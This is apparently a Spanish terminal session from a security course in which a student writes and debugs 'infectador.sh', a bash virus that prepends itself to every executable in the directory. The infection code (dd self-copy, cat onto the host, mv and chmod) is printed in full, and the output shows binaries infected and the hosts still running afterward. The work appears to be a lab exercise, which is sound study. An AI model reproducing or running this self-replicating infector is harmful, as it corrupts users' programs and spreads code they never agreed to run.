@@ -1,0 +1,471 @@
+@l105d1-linux:~$ vi hola.c
+eriteja@l105d1-linux:~$ gcc hola.c -o 1
+eriteja@l105d1-linux:~$ ./1
+Programa 1 .../1 
+eriteja@l105d1-linux:~$ ./1
+Programa 1 .../1 
+eriteja@l105d1-linux:~$ ./1
+Programa 1 .../1 
+eriteja@l105d1-linux:~$ ../Vir16/hola
+bash: ../Vir16/hola: No existe el archivo o el directorio
+eriteja@l105d1-linux:~$ vi infectador.sh
+eriteja@l105d1-linux:~$ vi infectador.sh
+eriteja@l105d1-linux:~$ cat infectador.sh 
+#!/bin/bash
+
+# Esto es un ejemplo muy sencillo de mecanismo de infección de un virus
+
+# Fase 1. Localización de ejecutables a infectar
+for fich in *
+do
+
+	if test -x $fich
+	then 
+		#Esquivar scripts del shell
+		if test $(head -n 1 $fich | cut -c 1-11) = "#!/bin/bash"
+		then 
+			echo "[Skip: $fich]"
+			continue 
+		fi	
+
+		#Fase 2. Infección de ejecutable.
+		echo "[Infectando: $fich]"
+		
+	fi
+done
+
+# Fase 2. Infección de ejecutable
+
+# Fase 3. Ejecutar payload
+
+# Fase 4. Ejecutar el programa huesped
+
+
+eriteja@l105d1-linux:~$ vi infectador.sh
+eriteja@l105d1-linux:~$ vi infectador.sh
+eriteja@l105d1-linux:~$ cd Documentos/SRS/Virus/
+eriteja@l105d1-linux:~/Documentos/SRS/Virus$ ls
+1  hola1.c  hola2.c  hola3.c  hola.c  infectador.sh
+eriteja@l105d1-linux:~/Documentos/SRS/Virus$ vi infectador.sh
+eriteja@l105d1-linux:~/Documentos/SRS/Virus$ vi infectador.sh
+eriteja@l105d1-linux:~/Documentos/SRS/Virus$ vi infectador.sh
+eriteja@l105d1-linux:~/Documentos/SRS/Virus$ vi infectador.sh
+eriteja@l105d1-linux:~/Documentos/SRS/Virus$ vi infectador.sh
+
+[No se ha escrito nada al disco desde el último cambio]
+eriteja@l105d1-linux:~/Documentos/SRS/Virus$ wc infectador.sh
+ 39 117 760 infectador.sh
+eriteja@l105d1-linux:~/Documentos/SRS/Virus$ vi infectador.sh 
+eriteja@l105d1-linux:~/Documentos/SRS/Virus$ ./infectador.sh
+bash: ./infectador.sh: Permiso denegado
+eriteja@l105d1-linux:~/Documentos/SRS/Virus$ ./infectador.sh
+bash: ./infectador.sh: Permiso denegado
+eriteja@l105d1-linux:~/Documentos/SRS/Virus$ ./hola2
+bash: ./hola2: No existe el archivo o el directorio
+eriteja@l105d1-linux:~/Documentos/SRS/Virus$ ls -lç
+ls: opción incorrecta -- «�»
+Pruebe 'ls --help' para más información.
+eriteja@l105d1-linux:~/Documentos/SRS/Virus$ ls -l
+total 32
+-rwxr-xr-x+ 1 eriteja usuarios del dominio 8608 oct  4 16:17 1
+-rw-r--r--+ 1 eriteja usuarios del dominio  106 oct  4 16:34 hola1.c
+-rw-r--r--+ 1 eriteja usuarios del dominio  106 oct  4 16:34 hola2.c
+-rw-r--r--+ 1 eriteja usuarios del dominio  106 oct  4 16:34 hola3.c
+-rw-r--r--+ 1 eriteja usuarios del dominio  106 oct  4 16:17 hola.c
+-rw-r--r--+ 1 eriteja usuarios del dominio  759 oct  4 16:47 infectador.sh
+eriteja@l105d1-linux:~/Documentos/SRS/Virus$ ./1
+Programa 1 .../1 
+eriteja@l105d1-linux:~/Documentos/SRS/Virus$ cp 1 2
+eriteja@l105d1-linux:~/Documentos/SRS/Virus$ cp 1 3
+eriteja@l105d1-linux:~/Documentos/SRS/Virus$ cp 1 45
+eriteja@l105d1-linux:~/Documentos/SRS/Virus$ cp 1 5
+eriteja@l105d1-linux:~/Documentos/SRS/Virus$ ls -l
+total 80
+-rwxr-xr-x+ 1 eriteja usuarios del dominio 8608 oct  4 16:17 1
+-rwxr-xr-x+ 1 eriteja usuarios del dominio 8608 oct  4 16:48 2
+-rwxr-xr-x+ 1 eriteja usuarios del dominio 8608 oct  4 16:48 3
+-rwxr-xr-x+ 1 eriteja usuarios del dominio 8608 oct  4 16:48 45
+-rwxr-xr-x+ 1 eriteja usuarios del dominio 8608 oct  4 16:48 5
+-rw-r--r--+ 1 eriteja usuarios del dominio  106 oct  4 16:34 hola1.c
+-rw-r--r--+ 1 eriteja usuarios del dominio  106 oct  4 16:34 hola2.c
+-rw-r--r--+ 1 eriteja usuarios del dominio  106 oct  4 16:34 hola3.c
+-rw-r--r--+ 1 eriteja usuarios del dominio  106 oct  4 16:17 hola.c
+-rw-r--r--+ 1 eriteja usuarios del dominio  759 oct  4 16:47 infectador.sh
+eriteja@l105d1-linux:~/Documentos/SRS/Virus$ ./infectador.sh
+bash: ./infectador.sh: Permiso denegado
+eriteja@l105d1-linux:~/Documentos/SRS/Virus$ ./infectador.sh
+[Infectando: 1]
+759+0 registros leídos
+759+0 registros escritos
+759 bytes copied, 0,00267842 s, 283 kB/s
+[Infectando: 2]
+759+0 registros leídos
+759+0 registros escritos
+759 bytes copied, 0,00339673 s, 223 kB/s
+[Infectando: 3]
+759+0 registros leídos
+759+0 registros escritos
+759 bytes copied, 0,0032103 s, 236 kB/s
+[Infectando: 45]
+759+0 registros leídos
+759+0 registros escritos
+759 bytes copied, 0,0028746 s, 264 kB/s
+[Infectando: 5]
+759+0 registros leídos
+759+0 registros escritos
+759 bytes copied, 0,0040284 s, 188 kB/s
+[No ejecutable hola1.c]
+[No ejecutable hola2.c]
+[No ejecutable hola3.c]
+[No ejecutable hola.c]
+[Skip: infectador.sh]
+eriteja@l105d1-linux:~/Documentos/SRS/Virus$ more 2
+#!/bin/bash
+
+# Esto es un ejemplo muy sencillo de mecanismo de infección de un virus
+TAM=760
+# Fase 1. Localización de ejecutables a infectar
+for fich in *
+do
+
+	if test -x $fich
+	then 
+		#Esquivar scripts del shell
+		if test $(head -n 1 $fich | cut -c 1-11) = "#!/bin/bash"
+		then 
+			echo "[Skip: $fich]"
+			continue 
+		fi	
+
+		#Fase 2. Infección de ejecutable.
+		echo "[Infectando: $fich]"
+		dd if=$0 of=/tmp/virus bs=1 count=$TAM
+		cat /tmp/virus $fich> /tmp/infectado
+		
+		#Mover el resultado sobre el fichero original
+		mv /tmp/infectado $fich
+		chmod +x $fich
+			
+	else
+		echo "[No ejecutable $fich]"
+	fi
+done
+
+# Fase 2. Infección de ejecutable
+
+# Fase 3. Ejecutar payload
+
+# Fase 4. Ejecutar el programa huesped
+exit 0
+#Fin 
+echo "Programa huesped"ELFIBC_2.2.5
+TL�% -Más--(22%)
+--Más--(24%)
+
+
+
+
+
+
+--Más--(53%)
+--Más--(55%)
+--Más--(60%)
+--Más--(65%)
+frameash--Más--(77%)--(76%)--Más--(75%)
+--Más--(82%)
+
+--Más--(92%)
+
+eriteja@l105d1-linux:~/Documentos/SRS/Virus$ 
+eriteja@l105d1-linux:~/Documentos/SRS/Virus$ 
+eriteja@l105d1-linux:~/Documentos/SRS/Virus$ 
+eriteja@l105d1-linux:~/Documentos/SRS/Virus$ 
+eriteja@l105d1-linux:~/Documentos/SRS/Virus$ 
+eriteja@l105d1-linux:~/Documentos/SRS/Virus$ 
+eriteja@l105d1-linux:~/Documentos/SRS/Virus$ 
+eriteja@l105d1-linux:~/Documentos/SRS/Virus$ 
+eriteja@l105d1-linux:~/Documentos/SRS/Virus$ 
+eriteja@l105d1-linux:~/Documentos/SRS/Virus$ 
+eriteja@l105d1-linux:~/Documentos/SRS/Virus$ ./2
+[Skip: 1]
+[Skip: 2]
+[Skip: 3]
+[Skip: 45]
+[Skip: 5]
+[No ejecutable hola1.c]
+[No ejecutable hola2.c]
+[No ejecutable hola3.c]
+[No ejecutable hola.c]
+[Skip: infectador.sh]
+eriteja@l105d1-linux:~/Documentos/SRS/Virus$ 
+eriteja@l105d1-linux:~/Documentos/SRS/Virus$ 
+eriteja@l105d1-linux:~/Documentos/SRS/Virus$ vim infectador.sh 
+eriteja@l105d1-linux:~/Documentos/SRS/Virus$ wc infectador.sh
+ 47 125 860 infectador.sh
+eriteja@l105d1-linux:~/Documentos/SRS/Virus$ vim infectador.sh 
+eriteja@l105d1-linux:~/Documentos/SRS/Virus$ ./infectador.sh 
+[Skip: 1]
+[Skip: 2]
+[Skip: 3]
+[Skip: 45]
+[Skip: 5]
+[No ejecutable hola1.c]
+[No ejecutable hola2.c]
+[No ejecutable hola3.c]
+[No ejecutable hola.c]
+[Skip: infectador.sh]
+ejecutando payload....
+0+0 registros leídos
+0+0 registros escritos
+0 bytes copied, 0,000873077 s, 0,0 kB/s
+chmod: no se puede acceder a '/tmp/original/': No es un directorio
+./infectador.sh: línea 39: /tmp/original: Permiso denegado
+eriteja@l105d1-linux:~/Documentos/SRS/Virus$ clear
+@l105d1-linux:~/Documentos/SRS/Virus$ clear
+@l105d1-linux:~/Documentos/SRS/Virus$ ./infectador.sh 
+[Skip: 1]
+[Skip: 2]
+[Skip: 3]
+[Skip: 45]
+[Skip: 5]
+[No ejecutable hola1.c]
+[No ejecutable hola2.c]
+[No ejecutable hola3.c]
+[No ejecutable hola.c]
+[Skip: infectador.sh]
+ejecutando payload....
+0+0 registros leídos
+0+0 registros escritos
+0 bytes copied, 0,000815565 s, 0,0 kB/s
+chmod: no se puede acceder a '/tmp/original/': No es un directorio
+./infectador.sh: línea 39: /tmp/original: Permiso denegado
+eriteja@l105d1-linux:~/Documentos/SRS/Virus$ vim infectador.sh 
+eriteja@l105d1-linux:~/Documentos/SRS/Virus$ wc infectador.sh
+ 43 125 856 infectador.sh
+eriteja@l105d1-linux:~/Documentos/SRS/Virus$ vim infectador.sh 
+eriteja@l105d1-linux:~/Documentos/SRS/Virus$ ./infectador.sh 
+[Skip: 1]
+[Skip: 2]
+[Skip: 3]
+[Skip: 45]
+[Skip: 5]
+[No ejecutable hola1.c]
+[No ejecutable hola2.c]
+[No ejecutable hola3.c]
+[No ejecutable hola.c]
+[Skip: infectador.sh]
+ejecutando payload....
+0+0 registros leídos
+0+0 registros escritos
+0 bytes copied, 0,000820821 s, 0,0 kB/s
+chmod: no se puede acceder a '/tmp/original/': No es un directorio
+./infectador.sh: línea 39: /tmp/original: Permiso denegado
+eriteja@l105d1-linux:~/Documentos/SRS/Virus$ vim infectador.sh 
+eriteja@l105d1-linux:~/Documentos/SRS/Virus$ ./1
+[Skip: 1]
+[Skip: 2]
+[Skip: 3]
+[Skip: 45]
+[Skip: 5]
+[No ejecutable hola1.c]
+[No ejecutable hola2.c]
+[No ejecutable hola3.c]
+[No ejecutable hola.c]
+[Skip: infectador.sh]
+eriteja@l105d1-linux:~/Documentos/SRS/Virus$ vim 1
+eriteja@l105d1-linux:~/Documentos/SRS/Virus$ ./1
+bash: ./1: no puede ejecutar el archivo binario: Formato de ejecutable incorrecto
+eriteja@l105d1-linux:~/Documentos/SRS/Virus$ ./2
+[Infectando: 1]
+760+0 registros leídos
+760+0 registros escritos
+760 bytes copied, 0,00271817 s, 280 kB/s
+[Skip: 2]
+[Skip: 3]
+[Skip: 45]
+[Skip: 5]
+[No ejecutable hola1.c]
+[No ejecutable hola2.c]
+[No ejecutable hola3.c]
+[No ejecutable hola.c]
+[Skip: infectador.sh]
+eriteja@l105d1-linux:~/Documentos/SRS/Virus$ vim 2
+eriteja@l105d1-linux:~/Documentos/SRS/Virus$ vim 1
+eriteja@l105d1-linux:~/Documentos/SRS/Virus$ vim infectador.sh 
+eriteja@l105d1-linux:~/Documentos/SRS/Virus$ ./1
+Programa 1 .../1 
+eriteja@l105d1-linux:~/Documentos/SRS/Virus$ cp ./2
+cp: falta el operando archivo de destino después de './2'
+Pruebe 'cp --help' para más información.
+eriteja@l105d1-linux:~/Documentos/SRS/Virus$ cp 2
+cp: falta el operando archivo de destino después de '2'
+Pruebe 'cp --help' para más información.
+eriteja@l105d1-linux:~/Documentos/SRS/Virus$ cp 1 2
+eriteja@l105d1-linux:~/Documentos/SRS/Virus$ cp 1 3
+eriteja@l105d1-linux:~/Documentos/SRS/Virus$ cp 1 4
+eriteja@l105d1-linux:~/Documentos/SRS/Virus$ cp 1 5
+eriteja@l105d1-linux:~/Documentos/SRS/Virus$ cp 1 6
+eriteja@l105d1-linux:~/Documentos/SRS/Virus$ ls -l
+total 92
+-rwxr-xr-x+ 1 eriteja usuarios del dominio 8608 oct  4 16:17 1
+-rwxr-xr-x+ 1 eriteja usuarios del dominio 8608 oct  4 16:58 2
+-rwxr-xr-x+ 1 eriteja usuarios del dominio 8608 oct  4 16:58 3
+-rwxr-xr-x+ 1 eriteja usuarios del dominio 8608 oct  4 16:59 4
+-rwxr-xr-x+ 1 eriteja usuarios del dominio 8608 oct  4 16:59 5
+-rwxr-xr-x+ 1 eriteja usuarios del dominio 8608 oct  4 16:59 6
+-rw-r--r--+ 1 eriteja usuarios del dominio  106 oct  4 16:34 hola1.c
+-rw-r--r--+ 1 eriteja usuarios del dominio  106 oct  4 16:34 hola2.c
+-rw-r--r--+ 1 eriteja usuarios del dominio  106 oct  4 16:34 hola3.c
+-rw-r--r--+ 1 eriteja usuarios del dominio  106 oct  4 16:17 hola.c
+-rwxr-xr-x+ 1 eriteja usuarios del dominio  858 oct  4 16:58 infectador.sh
+eriteja@l105d1-linux:~/Documentos/SRS/Virus$ .-2
+.-2: no se encontró la orden
+eriteja@l105d1-linux:~/Documentos/SRS/Virus$ ./2
+Programa 1 .../2 
+eriteja@l105d1-linux:~/Documentos/SRS/Virus$ ./3
+Programa 1 .../3 
+eriteja@l105d1-linux:~/Documentos/SRS/Virus$ ./4
+Programa 1 .../4 
+eriteja@l105d1-linux:~/Documentos/SRS/Virus$ ./infectador.sh 
+[Infectando: 1]
+856+0 registros leídos
+856+0 registros escritos
+856 bytes copied, 0,00488738 s, 175 kB/s
+[Infectando: 2]
+856+0 registros leídos
+856+0 registros escritos
+856 bytes copied, 0,00430152 s, 199 kB/s
+[Infectando: 3]
+856+0 registros leídos
+856+0 registros escritos
+856 bytes copied, 0,00330806 s, 259 kB/s
+[Infectando: 4]
+856+0 registros leídos
+856+0 registros escritos
+856 bytes copied, 0,00348932 s, 245 kB/s
+[Infectando: 5]
+856+0 registros leídos
+856+0 registros escritos
+856 bytes copied, 0,00324616 s, 264 kB/s
+[Infectando: 6]
+856+0 registros leídos
+856+0 registros escritos
+856 bytes copied, 0,0036528 s, 234 kB/s
+[No ejecutable hola1.c]
+[No ejecutable hola2.c]
+[No ejecutable hola3.c]
+[No ejecutable hola.c]
+[Skip: infectador.sh]
+ejecutando payload....
+chmod: no se puede acceder a '/tmp/original/': No es un directorio
+./infectador.sh: línea 39: /tmp/original: Permiso denegado
+eriteja@l105d1-linux:~/Documentos/SRS/Virus$ ./2
+[Skip: 1]
+[Skip: 2]
+[Skip: 3]
+[Skip: 4]
+[Skip: 5]
+[Skip: 6]
+[No ejecutable hola1.c]
+[No ejecutable hola2.c]
+[No ejecutable hola3.c]
+[No ejecutable hola.c]
+[Skip: infectador.sh]
+ejecutando payload....
+chmod: no se puede acceder a '/tmp/original/': No es un directorio
+./2: línea 39: /tmp/original: Permiso denegado
+eriteja@l105d1-linux:~/Documentos/SRS/Virus$ ./2
+[Skip: 1]
+[Skip: 2]
+[Skip: 3]
+[Skip: 4]
+[Skip: 5]
+[Skip: 6]
+[No ejecutable hola1.c]
+[No ejecutable hola2.c]
+[No ejecutable hola3.c]
+[No ejecutable hola.c]
+[Skip: infectador.sh]
+ejecutando payload....
+chmod: no se puede acceder a '/tmp/original/': No es un directorio
+./2: línea 39: /tmp/original: Permiso denegado
+eriteja@l105d1-linux:~/Documentos/SRS/Virus$ vim infectador.sh 
+eriteja@l105d1-linux:~/Documentos/SRS/Virus$ wc infectador.sh 
+ 43 126 857 infectador.sh
+eriteja@l105d1-linux:~/Documentos/SRS/Virus$ vim infectador.sh 
+eriteja@l105d1-linux:~/Documentos/SRS/Virus$ gcc hola.c -o hola
+eriteja@l105d1-linux:~/Documentos/SRS/Virus$ ./hola
+Programa 1 .../hola 
+eriteja@l105d1-linux:~/Documentos/SRS/Virus$ vim hola
+eriteja@l105d1-linux:~/Documentos/SRS/Virus$ ./hola
+Programa 1 .../hola 
+eriteja@l105d1-linux:~/Documentos/SRS/Virus$ vim hola.c
+eriteja@l105d1-linux:~/Documentos/SRS/Virus$ gcc hola.c -o hola
+eriteja@l105d1-linux:~/Documentos/SRS/Virus$ ./hola
+Inicio .../hola 
+Terminando.....eriteja@l105d1-linux:~/Documentos/SRS/Virus$ vim hola.c
+eriteja@l105d1-linux:~/Documentos/SRS/Virus$ gcc hola.c -o hola
+eriteja@l105d1-linux:~/Documentos/SRS/Virus$ ./infectador.sh 
+[Skip: 1]
+[Skip: 2]
+[Skip: 3]
+[Skip: 4]
+[Skip: 5]
+[Skip: 6]
+[Infectando: hola]
+857+0 registros leídos
+857+0 registros escritos
+857 bytes copied, 0,00314463 s, 273 kB/s
+[No ejecutable hola1.c]
+[No ejecutable hola2.c]
+[No ejecutable hola3.c]
+[No ejecutable hola.c]
+[Skip: infectador.sh]
+ejecutando payload....
+eriteja@l105d1-linux:~/Documentos/SRS/Virus$ ls
+1  2  3  4  5  6  hola	hola1.c  hola2.c  hola3.c  hola.c  infectador.sh
+eriteja@l105d1-linux:~/Documentos/SRS/Virus$ ls -l
+total 104
+-rwxr-xr-x+ 1 eriteja usuarios del dominio 9464 oct  4 17:04 1
+-rwxr-xr-x+ 1 eriteja usuarios del dominio 9464 oct  4 17:04 2
+-rwxr-xr-x+ 1 eriteja usuarios del dominio 9464 oct  4 17:04 3
+-rwxr-xr-x+ 1 eriteja usuarios del dominio 9464 oct  4 17:04 4
+-rwxr-xr-x+ 1 eriteja usuarios del dominio 9464 oct  4 17:04 5
+-rwxr-xr-x+ 1 eriteja usuarios del dominio 9464 oct  4 17:04 6
+-rwxr-xr-x+ 1 eriteja usuarios del dominio 9513 oct  4 17:12 hola
+-rw-r--r--+ 1 eriteja usuarios del dominio  106 oct  4 16:34 hola1.c
+-rw-r--r--+ 1 eriteja usuarios del dominio  106 oct  4 16:34 hola2.c
+-rw-r--r--+ 1 eriteja usuarios del dominio  106 oct  4 16:34 hola3.c
+-rw-r--r--+ 1 eriteja usuarios del dominio  160 oct  4 17:12 hola.c
+-rwxr-xr-x+ 1 eriteja usuarios del dominio  857 oct  4 17:05 infectador.sh
+eriteja@l105d1-linux:~/Documentos/SRS/Virus$ ./hola
+[Skip: 1]
+[Skip: 2]
+[Skip: 3]
+[Skip: 4]
+[Skip: 5]
+[Skip: 6]
+[Skip: hola]
+[No ejecutable hola1.c]
+[No ejecutable hola2.c]
+[No ejecutable hola3.c]
+[No ejecutable hola.c]
+[Skip: infectador.sh]
+ejecutando payload....
+Inicio ../tmp/original Terminando.....eriteja@l105d1-linux:~/Documentos/SRS/Virus$ ./hola
+[Skip: 1]
+[Skip: 2]
+[Skip: 3]
+[Skip: 4]
+[Skip: 5]
+[Skip: 6]
+[Skip: hola]
+[No ejecutable hola1.c]
+[No ejecutable hola2.c]
+[No ejecutable hola3.c]
+[No ejecutable hola.c]
+[Skip: infectador.sh]
+ejecutando payload....
+Inicio ../tmp/original Terminando.....eriteja@l105d1-linux:~/Documentos/SRS/Virus$ vim hola.c
+eriteja@l105d1-linux:~/Documentos/SRS/Virus$ vim infectador.sh 
+eriteja@l105d1-linux:~/Documentos/SRS/Virus$ A
